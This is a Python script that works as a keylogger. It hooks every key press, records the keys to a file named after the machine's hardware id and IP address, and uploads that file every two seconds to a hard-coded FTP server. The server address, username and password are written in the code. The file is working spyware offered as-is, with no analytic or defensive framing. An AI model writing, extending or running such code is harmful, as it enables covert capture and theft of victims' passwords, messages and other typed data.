import keyboard
import time
import os
from ftplib import FTP
import threading
import socket
import uuid


# Default FTP server details
default_ftp_host = '185.27.134.11'
default_ftp_user = 'epiz_34312365'
default_ftp_pass = 'EbhLW79qLv65S'
default_htdocs_dir = 'htdocs'


# Function to read the FTP server details from var.txt
def read_ftp_details():
    # Check if the var.txt file exists
    if os.path.exists("var.txt"):
        # Read the contents of the var.txt file
        with open("var.txt", "r") as var_file:
            lines = var_file.readlines()

        # Extract the FTP server details from the var.txt file
        for line in lines:
            key, value = line.strip().split("=")
            if key == "ftp_host":
                ftp_host = value
            elif key == "ftp_user":
                ftp_user = value
            elif key == "ftp_pass":
                ftp_pass = value
            elif key == "htdocs_dir":
                htdocs_dir = value
    else:
        # Create var.txt with default FTP server details
        with open("var.txt", "w") as var_file:
            var_file.write(f"ftp_host={default_ftp_host}\n")
            var_file.write(f"ftp_user={default_ftp_user}\n")
            var_file.write(f"ftp_pass={default_ftp_pass}\n")
            var_file.write(f"htdocs_dir={default_htdocs_dir}\n")

        # Use the default FTP server details
        ftp_host = default_ftp_host
        ftp_user = default_ftp_user
        ftp_pass = default_ftp_pass
        htdocs_dir = default_htdocs_dir

    return ftp_host, ftp_user, ftp_pass, htdocs_dir

# Find an available filename by appending a number
def get_available_filename(base_filename):
    index = 1
    new_filename = base_filename
    while os.path.exists(new_filename):
        new_filename = f"{base_filename}{index}"
        index += 1
    return new_filename

# Determine the next available filename
ip_address = socket.gethostbyname(socket.gethostname())
ip_filename = ip_address.replace('.', '')
computer_id = str(uuid.getnode())
filename = get_available_filename("driveInfo_"+computer_id+"_"+ip_filename+'_')

# Open the text file in append mode with buffering
file = open(filename, "a", buffering=1)

def on_key_press(event):
    # Check if the pressed key is the spacebar
    if event.name == 'space':
        # Write a blank space to the text file
        file.write(' ')
    # Check if the pressed key is the Enter key
    elif event.name == 'enter':
        # Write a new line to the text file
        file.write('\n')
    else:
        # Write the pressed key to the text file
        file.write(event.name)

# Set up the keyboard hook
keyboard.on_press(on_key_press)

# Set the interval for automatic updates (2 seconds)
update_interval = 2

# Get the current time
last_update_time = time.time()

# Connect to the FTP server
def connect_to_ftp():
    global ftp, ftp_host, ftp_user, ftp_pass, htdocs_dir
    try:
        ftp_host, ftp_user, ftp_pass, htdocs_dir = read_ftp_details()
        ftp = FTP(ftp_host)
        ftp.login(user=ftp_user, passwd=ftp_pass)
        ftp.cwd(htdocs_dir)
    except Exception as e:
        # Handle connection error and log the error
        print(f"An error occurred during FTP connection: {str(e)}")
        time.sleep(update_interval)
        connect_to_ftp()

# Function to upload file to FTP server
def upload_to_ftp():
    while True:
        try:
            # Upload the text file to the FTP server
            with open(filename, 'rb') as f:
                ftp.storbinary(f'STOR {filename}.php', f)
        
            # Sleep for a short interval
            time.sleep(update_interval)
        except Exception as e:
            # Handle exceptions and log the error
            print(f"An error occurred during FTP upload: {str(e)}")
            time.sleep(update_interval)
            connect_to_ftp()

# Create a new thread for FTP connection
connect_thread = threading.Thread(target=connect_to_ftp)
connect_thread.start()

# Create a new thread for FTP upload
ftp_thread = threading.Thread(target=upload_to_ftp)
ftp_thread.start()

while True:
    try:
        # Check if it's time for an automatic update
        if time.time() - last_update_time >= update_interval:
            # Flush the buffer to ensure the written data is saved
            file.flush()
            last_update_time = time.time()

            # Check if var.txt file has been modified
            if os.path.exists("var.txt") and os.path.getmtime("var.txt") > last_update_time:
                last_update_time = os.path.getmtime("var.txt")

                # Reconnect to the FTP server with updated details
                connect_to_ftp()

    except Exception as e:
        # Handle exceptions and log the error
        print(f"An error occurred: {str(e)}")

# Close the text file
file.close()

# Wait for the FTP threads to finish and close the FTP connection
connect_thread.join()
ftp_thread.join()
ftp.quit()
